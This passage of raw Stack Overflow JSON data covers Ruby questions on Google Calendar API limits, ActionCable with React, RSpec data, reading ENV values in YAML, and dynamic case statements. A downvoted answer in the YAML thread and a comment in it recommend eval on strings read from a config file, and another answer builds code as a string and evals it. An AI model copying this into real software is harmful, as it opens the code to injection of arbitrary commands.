his or her calendar within a short period of time, that user might lose calendar edit access.</p>\n<p>If a user creates more than 25 new calendars within a short period of time, that user's calendar might go into read-only mode.</p>\n<p>In order to prevent spamming, Google Calendar limits the number of invitations a user can send to external guests. This limit varies depending on the action, and is usually between 100-300 guests.</p>\n</blockquote>\n<p>You can do this using a service account.  To my knowledge there is no limit to the number of events you can put in a calendar per day however as stated above there will be a limit to how many you can insert at once.</p>\n<p>I am not aware of a more sane option than this sorry.</p>\n"}], "owner": {"reputation": 7734, "user_id": 2490003, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/3dRD0.png?s=128&g=1", "display_name": "user2490003", "link": "https://stackoverflow.com/users/2490003/user2490003"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1511863469, "creation_date": 1511848957, "last_edit_date": 1511863469, "question_id": 47524931, "link": "https://stackoverflow.com/questions/47524931/is-there-a-limit-to-the-number-of-calendar-events-that-can-be-programmatically-s", "title": "Is there a limit to the number of calendar events that can be programmatically scheduled for a given user?", "body": "<p>My web app has an event scheduling feature, and I'd like to automatically create, update, and delete calendar events from users' individual calendars as the event details change on my site. </p>\n\n<p>My plan to do this is to set up an automated/service user (e.g. <code>events@example.co</code>) and use the Calendar API to send invites that come from that user. As the event gets updated I continue to use the API through that user (using a server-to-server authentication protocol, so no human authorization required) to modify the event and deliver updates</p>\n\n<p>If I'm scheduling several thousand events - will this scale with just one user? It doesn't feel right to schedule so many events under one automated user. But then again, it might work just fine.</p>\n\n<ol>\n<li><p>Is there a limit to how many events I can schedule?</p></li>\n<li><p>Is there a more sane way to approach this overall? </p></li>\n</ol>\n\n<p>Thanks!</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "reactjs", "websocket", "actioncable"], "owner": {"reputation": 160, "user_id": 7499006, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/26e5d39e3ed98d6107a08bdbd71e93ef?s=128&d=identicon&r=PG&f=1", "display_name": "zOs0", "link": "https://stackoverflow.com/users/7499006/zos0"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 234, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1511846947, "creation_date": 1511846947, "question_id": 47524579, "link": "https://stackoverflow.com/questions/47524579/how-to-require-actioncable-to-react-frontend-in-rails-5-1", "title": "How to require ActionCable to React frontend in Rails 5.1", "body": "<p>I know that it is easy to integrate React app with ActionCable using asset pipeline. But is there a good way to integrate it with separate components located in </p>\n\n<pre><code>app/javascript/components\n</code></pre>\n\n<p>For example we have <em>notifications_channel</em> located in </p>\n\n<pre><code>app/javascripts/channels\n</code></pre>\n\n<p>by default. But I need to handle WebSocket data in my React app located in</p>\n\n<pre><code>app/javasctipt\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "json", "ruby", "rspec"], "comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 2, "creation_date": 1511848117, "post_id": 47524195, "comment_id": 82005634, "body": "It\u2019s hard to say how to accomplish what you wanted because literally all the code is wrong and the intent is absolutely unclear."}], "answers": [{"tags": [], "owner": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "is_accepted": false, "score": 1, "last_activity_date": 1511851902, "creation_date": 1511851902, "answer_id": 47525561, "question_id": 47524195, "link": "https://stackoverflow.com/questions/47524195/how-to-import-ruby-rspec-data/47525561#47525561", "title": "How to import ruby RSpec data", "body": "<p>You can make the data into a plain json file:</p>\n\n<p><strong>food_data.json</strong></p>\n\n<pre><code>[\n{\n  \"Plant\": \"Fruit\",\n  \"Type\": \"Apple\"\n},\n{\n  \"Plant\": \"Vegetable\",\n  \"Type\": \"Carrot\"\n\n},\n{\n  \"Plant\": \"Fruit\",\n  \"Type\": \"Orange\"\n},\n{\n  \"Plant\": \"Vegetable\",\n  \"Type\": \"Spinach\"\n}\n\n]\n</code></pre>\n\n<p>then load it from ruby:</p>\n\n<pre><code>require 'json'\ndef foods\n  JSON.parse(File.read(\"food_data.json\")).first(2).map do |food|\n    food[\"Plant\"]\n  end\nend\n\nfoods # =&gt; [\"Fruit\", \"Vegetable\"]\n</code></pre>\n"}], "owner": {"reputation": 9, "user_id": 9018044, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34babc0c8fa1196be2c602d9010c8d47?s=128&d=identicon&r=PG&f=1", "display_name": "bob", "link": "https://stackoverflow.com/users/9018044/bob"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 142, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1511851902, "creation_date": 1511844502, "question_id": 47524195, "link": "https://stackoverflow.com/questions/47524195/how-to-import-ruby-rspec-data", "title": "How to import ruby RSpec data", "body": "<p>Can someone please show how to directly import ruby RSpec data . I haven't found a single answer to this after hours of research. </p>\n\n<p>I'm trying to return \"fruit\" and \"vegetable\" to the <strong>method foods</strong> in the pull.rb file. That data would come from the data.rb</p>\n\n<p><strong>data.rb</strong>\n<div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>let(:food_data) {\r\n  JSON.parse('[\r\n{\r\n  \"Plant\": \"Fruit\",\r\n  \"Type\": \"Apple\"\r\n},\r\n{\r\n  \"Plant\": \"Vegetable\",\r\n  \"Type\": \"Carrot\"\r\n\r\n},\r\n{\r\n  \"Plant\": \"Fruit\",\r\n  \"Type\": \"Orange\"\r\n},\r\n{\r\n  \"Plant\": \"Vegetable\",\r\n  \"Type\": \"Spinach\"\r\n}\r\n\r\n]')\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p><strong>pull.rb</strong></p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>def foods\r\nFile.open('data.rb'))\r\n    [:food_data][0]\r\n    [:food_data][1]\r\nend</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": ["ruby", "yaml"], "comments": [{"owner": {"reputation": 5513, "user_id": 2718801, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9d4b144cdafa73e1d470362ed8d7c3a9?s=128&d=identicon&r=PG", "display_name": "jhpratt", "link": "https://stackoverflow.com/users/2718801/jhpratt"}, "edited": false, "score": 0, "creation_date": 1511842193, "post_id": 47523813, "comment_id": 82003860, "body": "What are you using other than rails?"}, {"owner": {"reputation": 333, "user_id": 1339736, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/a3uG7.jpg?s=128&g=1", "display_name": "PackedUp", "link": "https://stackoverflow.com/users/1339736/packedup"}, "reply_to_user": {"reputation": 5513, "user_id": 2718801, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9d4b144cdafa73e1d470362ed8d7c3a9?s=128&d=identicon&r=PG", "display_name": "jhpratt", "link": "https://stackoverflow.com/users/2718801/jhpratt"}, "edited": false, "score": 0, "creation_date": 1511842282, "post_id": 47523813, "comment_id": 82003881, "body": "@jhpratt using it in a ruby script. Script loads a YAML file."}, {"owner": {"reputation": 5513, "user_id": 2718801, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9d4b144cdafa73e1d470362ed8d7c3a9?s=128&d=identicon&r=PG", "display_name": "jhpratt", "link": "https://stackoverflow.com/users/2718801/jhpratt"}, "edited": false, "score": 0, "creation_date": 1511842315, "post_id": 47523813, "comment_id": 82003892, "body": "Are you using any libraries? Is this a website? Your question isn&#39;t very clear on any of this."}, {"owner": {"reputation": 333, "user_id": 1339736, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/a3uG7.jpg?s=128&g=1", "display_name": "PackedUp", "link": "https://stackoverflow.com/users/1339736/packedup"}, "reply_to_user": {"reputation": 5513, "user_id": 2718801, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9d4b144cdafa73e1d470362ed8d7c3a9?s=128&d=identicon&r=PG", "display_name": "jhpratt", "link": "https://stackoverflow.com/users/2718801/jhpratt"}, "edited": false, "score": 0, "creation_date": 1511842835, "post_id": 47523813, "comment_id": 82004030, "body": "@jhpratt Updated my post to add clarity."}, {"owner": {"reputation": 5513, "user_id": 2718801, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9d4b144cdafa73e1d470362ed8d7c3a9?s=128&d=identicon&r=PG", "display_name": "jhpratt", "link": "https://stackoverflow.com/users/2718801/jhpratt"}, "edited": false, "score": 0, "creation_date": 1511842954, "post_id": 47523813, "comment_id": 82004059, "body": "That doesn&#39;t answer any of the questions I just asked."}, {"owner": {"reputation": 333, "user_id": 1339736, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/a3uG7.jpg?s=128&g=1", "display_name": "PackedUp", "link": "https://stackoverflow.com/users/1339736/packedup"}, "reply_to_user": {"reputation": 5513, "user_id": 2718801, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9d4b144cdafa73e1d470362ed8d7c3a9?s=128&d=identicon&r=PG", "display_name": "jhpratt", "link": "https://stackoverflow.com/users/2718801/jhpratt"}, "edited": false, "score": 0, "creation_date": 1511843054, "post_id": 47523813, "comment_id": 82004093, "body": "@jhpratt If you look at the code, it uses YAML gem. Thats about it."}, {"owner": {"reputation": 8454, "user_id": 958529, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3ec25db39c63bab1a11037649e326b8?s=128&d=identicon&r=PG", "display_name": "halfelf", "link": "https://stackoverflow.com/users/958529/halfelf"}, "edited": false, "score": 0, "creation_date": 1511843072, "post_id": 47523813, "comment_id": 82004100, "body": "<code>@database[&#39;TEST&#39;][&#39;PASSWORD&#39;]</code> should works if your yaml is written as expected. Why not just check what <code>@database</code> contains?"}, {"owner": {"reputation": 333, "user_id": 1339736, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/a3uG7.jpg?s=128&g=1", "display_name": "PackedUp", "link": "https://stackoverflow.com/users/1339736/packedup"}, "reply_to_user": {"reputation": 8454, "user_id": 958529, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3ec25db39c63bab1a11037649e326b8?s=128&d=identicon&r=PG", "display_name": "halfelf", "link": "https://stackoverflow.com/users/958529/halfelf"}, "edited": false, "score": 0, "creation_date": 1511843145, "post_id": 47523813, "comment_id": 82004118, "body": "@halfelf thats what i expected. But it just prints the literal value in the YAML file. Does not resolve the ENV"}, {"owner": {"reputation": 8454, "user_id": 958529, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3ec25db39c63bab1a11037649e326b8?s=128&d=identicon&r=PG", "display_name": "halfelf", "link": "https://stackoverflow.com/users/958529/halfelf"}, "edited": false, "score": 0, "creation_date": 1511843270, "post_id": 47523813, "comment_id": 82004155, "body": "If so, post your yaml file too. That will give us a verifiable example."}, {"owner": {"reputation": 505, "user_id": 3571257, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f374e7909c6b2c2ffbbadfdefdf9f11?s=128&d=identicon&r=PG&f=1", "display_name": "jemonsanto", "link": "https://stackoverflow.com/users/3571257/jemonsanto"}, "edited": false, "score": 0, "creation_date": 1511843303, "post_id": 47523813, "comment_id": 82004163, "body": "Do you have your environment variables setup on your terminal? Post your .bashrc or .zshrc as well, to see if the environment variables are properly set."}, {"owner": {"reputation": 333, "user_id": 1339736, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/a3uG7.jpg?s=128&g=1", "display_name": "PackedUp", "link": "https://stackoverflow.com/users/1339736/packedup"}, "reply_to_user": {"reputation": 8454, "user_id": 958529, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3ec25db39c63bab1a11037649e326b8?s=128&d=identicon&r=PG", "display_name": "halfelf", "link": "https://stackoverflow.com/users/958529/halfelf"}, "edited": false, "score": 0, "creation_date": 1511843365, "post_id": 47523813, "comment_id": 82004178, "body": "@halfelf Look at line 3 code snippet of my post.thx"}, {"owner": {"reputation": 333, "user_id": 1339736, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/a3uG7.jpg?s=128&g=1", "display_name": "PackedUp", "link": "https://stackoverflow.com/users/1339736/packedup"}, "reply_to_user": {"reputation": 505, "user_id": 3571257, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f374e7909c6b2c2ffbbadfdefdf9f11?s=128&d=identicon&r=PG&f=1", "display_name": "jemonsanto", "link": "https://stackoverflow.com/users/3571257/jemonsanto"}, "edited": false, "score": 0, "creation_date": 1511843400, "post_id": 47523813, "comment_id": 82004196, "body": "@jemonsanto Absolutely. If i just print the ENV variable it works, that is <b>puts ENV[&quot;TEST_DB_PASSWORD&quot;]</b> works but not <b>puts @databases[&#39;TEST&#39;][&#39;PASSWORD&#39;]</b>"}, {"owner": {"reputation": 8454, "user_id": 958529, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3ec25db39c63bab1a11037649e326b8?s=128&d=identicon&r=PG", "display_name": "halfelf", "link": "https://stackoverflow.com/users/958529/halfelf"}, "edited": false, "score": 0, "creation_date": 1511843843, "post_id": 47523813, "comment_id": 82004294, "body": "Sorry. I see what you mean now. First check if <code>ENV[&quot;TEST_DB_PW&quot;]</code> works. If so, test with <code>eval(@databases[&#39;TEST&#39;][&#39;PASSWORD&#39;])</code>, that will evaluate the expression, although I found the yaml may need a little fix about the quote mark. Using single quote around <code>TEST_DB_PW</code> should be ok."}, {"owner": {"reputation": 333, "user_id": 1339736, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/a3uG7.jpg?s=128&g=1", "display_name": "PackedUp", "link": "https://stackoverflow.com/users/1339736/packedup"}, "reply_to_user": {"reputation": 8454, "user_id": 958529, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3ec25db39c63bab1a11037649e326b8?s=128&d=identicon&r=PG", "display_name": "halfelf", "link": "https://stackoverflow.com/users/958529/halfelf"}, "edited": false, "score": 0, "creation_date": 1511844046, "post_id": 47523813, "comment_id": 82004345, "body": "@halfelf thanks. I was looking at the same when you replied. It works with eval."}, {"owner": {"reputation": 4739, "user_id": 5403468, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZJ8BE.jpg?s=128&g=1", "display_name": "Tiw", "link": "https://stackoverflow.com/users/5403468/tiw"}, "edited": false, "score": 0, "creation_date": 1552029308, "post_id": 47523813, "comment_id": 96865242, "body": "Please check <a href=\"http://stackoverflow.com/help/someone-answers\">someone-answers</a>  and  <a href=\"https://stackoverflow.com/help/accepted-answer\">accepted</a>."}], "answers": [{"comments": [{"owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 2, "creation_date": 1511860562, "post_id": 47524151, "comment_id": 82011770, "body": "Please, do not <b>EVER</b> use <code>eval</code> in this way. Never."}, {"owner": {"reputation": 333, "user_id": 1339736, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/a3uG7.jpg?s=128&g=1", "display_name": "PackedUp", "link": "https://stackoverflow.com/users/1339736/packedup"}, "reply_to_user": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 1, "creation_date": 1511882982, "post_id": 47524151, "comment_id": 82027164, "body": "@J&#246;rgWMittag okay, so what you suggest. Sorry, but i think you gave a -ve remark to my answer, but you never suggested any resolution."}], "tags": [], "owner": {"reputation": 333, "user_id": 1339736, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/a3uG7.jpg?s=128&g=1", "display_name": "PackedUp", "link": "https://stackoverflow.com/users/1339736/packedup"}, "is_accepted": false, "score": -3, "last_activity_date": 1511845704, "last_edit_date": 1511845704, "creation_date": 1511844157, "answer_id": 47524151, "question_id": 47523813, "link": "https://stackoverflow.com/questions/47523813/access-env-variable-in-yaml-file/47524151#47524151", "title": "Access &#39;ENV&#39; variable in YAML file", "body": "<p>This works for me and was confirmed by @halfelf</p>\n\n<pre><code>eval(@databases['TEST']['PASSWORD'])\n</code></pre>\n\n<p>if you want to assign it to a variable then</p>\n\n<pre><code>password =  eval(\"#{@databases['TEST']['PASSWORD']}\")\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "reply_to_user": {"reputation": 333, "user_id": 1339736, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/a3uG7.jpg?s=128&g=1", "display_name": "PackedUp", "link": "https://stackoverflow.com/users/1339736/packedup"}, "edited": false, "score": 1, "creation_date": 1511885611, "post_id": 47527170, "comment_id": 82029005, "body": "@PackedUp my example code is pure Ruby, it doesn&#39;t depend on Rails."}], "tags": [], "owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "is_accepted": false, "score": 12, "last_activity_date": 1511858209, "creation_date": 1511858209, "answer_id": 47527170, "question_id": 47523813, "link": "https://stackoverflow.com/questions/47523813/access-env-variable-in-yaml-file/47527170#47527170", "title": "Access &#39;ENV&#39; variable in YAML file", "body": "<blockquote>\n  <p>&lt;% ENV[\"TEST_DB_PW\"] %> works on RAILS but does not work if it is a simple ruby script.</p>\n</blockquote>\n\n<p><code>&lt;% ... %&gt;</code> is an <a href=\"http://ruby-doc.org/stdlib-2.4.2/libdoc/erb/rdoc/ERB.html\" rel=\"noreferrer\">ERB</a> tag. In order to use it, you have to parse the file accordingly.</p>\n\n<p>Assuming you have a file <code>config/database.yml</code>:</p>\n\n<pre><code>TEST: \n  PASSWORD: &lt;%= ENV[\"TEST_DB_PW\"] %&gt;\n</code></pre>\n\n<p>You can load it via:</p>\n\n<pre><code>require 'yaml'\nrequire 'erb'\n\nENV[\"TEST_DB_PW\"] = \"secret\"\n\nYAML.load(ERB.new(File.read('config/database.yml')).result)\n#=&gt; {\"TEST\"=&gt;{\"PASSWORD\"=&gt;\"secret\"}}\n</code></pre>\n"}], "owner": {"reputation": 333, "user_id": 1339736, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/a3uG7.jpg?s=128&g=1", "display_name": "PackedUp", "link": "https://stackoverflow.com/users/1339736/packedup"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7500, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1552029227, "creation_date": 1511841910, "last_edit_date": 1552029227, "question_id": 47523813, "link": "https://stackoverflow.com/questions/47523813/access-env-variable-in-yaml-file", "title": "Access &#39;ENV&#39; variable in YAML file", "body": "<p>I have a custom <code>yaml</code> file that needs to use an <code>ENV</code> variable.</p>\n\n<pre><code>YAML.load_file('config/databases.yml')\n</code></pre>\n\n<p>Need to access the PASSWORD variable from the <code>ENV</code> variable like the below from the <code>yaml</code> file</p>\n\n<pre><code>TEST: \n     PASSWORD:  ENV[\"TEST_DB_PW\"]\n</code></pre>\n\n<p>This is not a RAILS app. </p>\n\n<p>How do I do this? <code>&lt;% ENV[\"TEST_DB_PW\"] %&gt;</code> works on RAILS but does not work if it is a simple ruby script.</p>\n\n<pre><code>require 'yaml'\nclass Databases\n  def initialize\n    if File.exist?('config/databases.yml')\n      @databases=YAML.load_file('config/databases.yml')\n    else\n      # You screwed up... \n    end\n  end\nend\n\ndef print_data\n @databases['TEST']['PASSWORD']\nend\n</code></pre>\n\n<p><code>print_data</code> needs resolving to the <code>ENV</code> parameter referenced in the <code>YAML</code> file.</p>\n"}, {"tags": ["ruby", "dynamic-programming"], "comments": [{"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1511843244, "post_id": 47523756, "comment_id": 82004145, "body": "You can&#39;t. <code>case</code> construction is for static conditions. It is not the right choice here. If you want to handle what you have, use a function (method)."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1511846971, "post_id": 47523756, "comment_id": 82005263, "body": "@sawa you must be kidding. What about our best friend <code>eval</code>?"}], "answers": [{"comments": [{"owner": {"reputation": 129, "user_id": 8005666, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/09a38c5a139fdc8a2927b1415396ce5d?s=128&d=identicon&r=PG&f=1", "display_name": "Bill Bisco", "link": "https://stackoverflow.com/users/8005666/bill-bisco"}, "edited": false, "score": 0, "creation_date": 1511843672, "post_id": 47523846, "comment_id": 82004255, "body": "Thanks for the response, but it doesn&#39;t quite work for me.  It may have something to do with part of the response needs to be in quotes and another without"}, {"owner": {"reputation": 11741, "user_id": 1934428, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/072774c5d4204a1c2385560e6114a887?s=128&d=identicon&r=PG", "display_name": "user1934428", "link": "https://stackoverflow.com/users/1934428/user1934428"}, "reply_to_user": {"reputation": 129, "user_id": 8005666, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/09a38c5a139fdc8a2927b1415396ce5d?s=128&d=identicon&r=PG&f=1", "display_name": "Bill Bisco", "link": "https://stackoverflow.com/users/8005666/bill-bisco"}, "edited": false, "score": 1, "creation_date": 1511846949, "post_id": 47523846, "comment_id": 82005257, "body": "@BillBisco &quot;Does not work&quot; is to general. Be more precise. What result do you get? Also note that the solution posted by Rots operates with numeric values, while your original attempt operates on strings."}, {"owner": {"reputation": 5286, "user_id": 455770, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mMHwz.jpg?s=128&g=1", "display_name": "Rots", "link": "https://stackoverflow.com/users/455770/rots"}, "edited": false, "score": 0, "creation_date": 1511849999, "post_id": 47523846, "comment_id": 82006331, "body": "The linked repl has a solution for the non-numeric values. It was out of scope of the question so left it from the answer."}], "tags": [], "owner": {"reputation": 5286, "user_id": 455770, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mMHwz.jpg?s=128&g=1", "display_name": "Rots", "link": "https://stackoverflow.com/users/455770/rots"}, "is_accepted": false, "score": 1, "last_activity_date": 1511842121, "creation_date": 1511842121, "answer_id": 47523846, "question_id": 47523756, "link": "https://stackoverflow.com/questions/47523756/dynamic-case-when-conditions/47523846#47523846", "title": "Dynamic &#39;case&#39; &#39;when&#39; conditions", "body": "<pre><code>when 1..99\n  send(\"buy_item_index\",  input)\nend\n</code></pre>\n\n<p><a href=\"https://repl.it/repls/ChillyPaltryHippopotamus\" rel=\"nofollow noreferrer\">https://repl.it/repls/ChillyPaltryHippopotamus</a></p>\n"}, {"comments": [{"owner": {"reputation": 3286, "user_id": 1851041, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/736f0189c216f8d9ece902e96fd37f6a?s=128&d=identicon&r=PG", "display_name": "BernardK", "link": "https://stackoverflow.com/users/1851041/bernardk"}, "edited": false, "score": 0, "creation_date": 1511961255, "post_id": 47524636, "comment_id": 82063986, "body": "Doesn&#39;t it exactly answer what you have asked ? I would appreciate a feedback."}, {"owner": {"reputation": 129, "user_id": 8005666, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/09a38c5a139fdc8a2927b1415396ce5d?s=128&d=identicon&r=PG&f=1", "display_name": "Bill Bisco", "link": "https://stackoverflow.com/users/8005666/bill-bisco"}, "edited": false, "score": 0, "creation_date": 1511971344, "post_id": 47524636, "comment_id": 82071274, "body": "Hi BernardK  I appreciate your responses. I got a little stuck because I couldn&#39;t replicate what you&#39;re doing exactly in Cloud9.  I&#39;ll take a step back and try implementing your prepare_buy_menu_and_case and see if can get it to work!"}, {"owner": {"reputation": 129, "user_id": 8005666, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/09a38c5a139fdc8a2927b1415396ce5d?s=128&d=identicon&r=PG&f=1", "display_name": "Bill Bisco", "link": "https://stackoverflow.com/users/8005666/bill-bisco"}, "edited": false, "score": 0, "creation_date": 1511980472, "post_id": 47524636, "comment_id": 82076680, "body": "I just tested this and it does work!  I commented out some puts.  It&#39;s nice.  Thanks!"}], "tags": [], "owner": {"reputation": 3286, "user_id": 1851041, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/736f0189c216f8d9ece902e96fd37f6a?s=128&d=identicon&r=PG", "display_name": "BernardK", "link": "https://stackoverflow.com/users/1851041/bernardk"}, "is_accepted": false, "score": 1, "last_activity_date": 1511847294, "creation_date": 1511847294, "answer_id": 47524636, "question_id": 47523756, "link": "https://stackoverflow.com/questions/47523756/dynamic-case-when-conditions/47524636#47524636", "title": "Dynamic &#39;case&#39; &#39;when&#39; conditions", "body": "<p>There are many ways to do things in Ruby. This is one solution :</p>\n\n<pre><code>O  = Struct.new(:name, :price)\no1 = O.new('a', 1)\no2 = O.new('b', 2)\no3 = O.new('c', 3)\no4 = O.new('d', 4)\no5 = O.new('e', 5)\nMASTER_INVENTORY = [o1, o2, o3, o4, o5]\n\ndef buy_item_index(p)\n    puts \"-----buy #{p}\"\nend\n\ndef main_menu\n    puts '-----Main Menu'\nend\n\ndef prepare_buy_menu_and_case\n    choices = ['Go [B]ack']\n    i = 1\n    MASTER_INVENTORY.each do |obj| \n        choices &lt;&lt; \"[#{i}] Buy #{obj.name} Price: #{obj.price}\"\n        i += 1\n    end\n    @choice_map = choices.join(\"\\n\")\n\n    @case_body = ''\n    MASTER_INVENTORY.size.times do | number0 |\n        number = number0 + 1\n        @case_body &lt;&lt;\n            \"when '#{number}'\n                buy_item_index(#{number})\n                buy_menu\\n\"\n        puts \"when #{number} generated\"\n    end\n    puts \"@case_body=#{@case_body}\"\nend\n\ndef buy_menu\n    puts @choice_map\n    input = gets.chomp\n\n    eval(\"\n    case input\n    when 'b', 'B'\n        main_menu\n    #{@case_body}\n    else\n        puts 'Not a valid input'\n        buy_menu\n    end\n    \")\nend\n\nprepare_buy_menu_and_case\nbuy_menu\n</code></pre>\n\n<p>Execution :</p>\n\n<pre><code>$ ruby -w t.rb \nt.rb:40: warning: assigned but unused variable - input\nwhen 1 generated\nwhen 2 generated\nwhen 3 generated\nwhen 4 generated\nwhen 5 generated\n@case_body=when '1'\n                buy_item_index(1)\n                buy_menu\nwhen '2'\n...\nGo [B]ack\n[1] Buy a Price: 1\n[2] Buy b Price: 2\n[3] Buy c Price: 3\n[4] Buy d Price: 4\n[5] Buy e Price: 5\n2\n-----buy 2\nGo [B]ack\n[1] Buy a Price: 1\n[2] Buy b Price: 2\n[3] Buy c Price: 3\n[4] Buy d Price: 4\n[5] Buy e Price: 5\n5\n-----buy 5\nGo [B]ack\n[1] Buy a Price: 1\n[2] Buy b Price: 2\n[3] Buy c Price: 3\n[4] Buy d Price: 4\n[5] Buy e Price: 5\n6\nNot a valid input\nGo [B]ack\n[1] Buy a Price: 1\n[2] Buy b Price: 2\n[3] Buy c Price: 3\n[4] Buy d Price: 4\n[5] Buy e Price: 5\nb\n-----Main Menu\n$\n</code></pre>\n\n<p>This time, the warning about <code>assigned but unused variable</code> can be ignored.</p>\n\n<p>Preparing the menu and the <code>case</code> code separately in <code>prepare_buy_menu_and_case</code> avoids to recompute them each time <code>buy_menu</code> is called.</p>\n\n<p>The initial <code>puts</code> are for my comfort and can of course be removed.</p>\n"}, {"comments": [{"owner": {"reputation": 129, "user_id": 8005666, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/09a38c5a139fdc8a2927b1415396ce5d?s=128&d=identicon&r=PG&f=1", 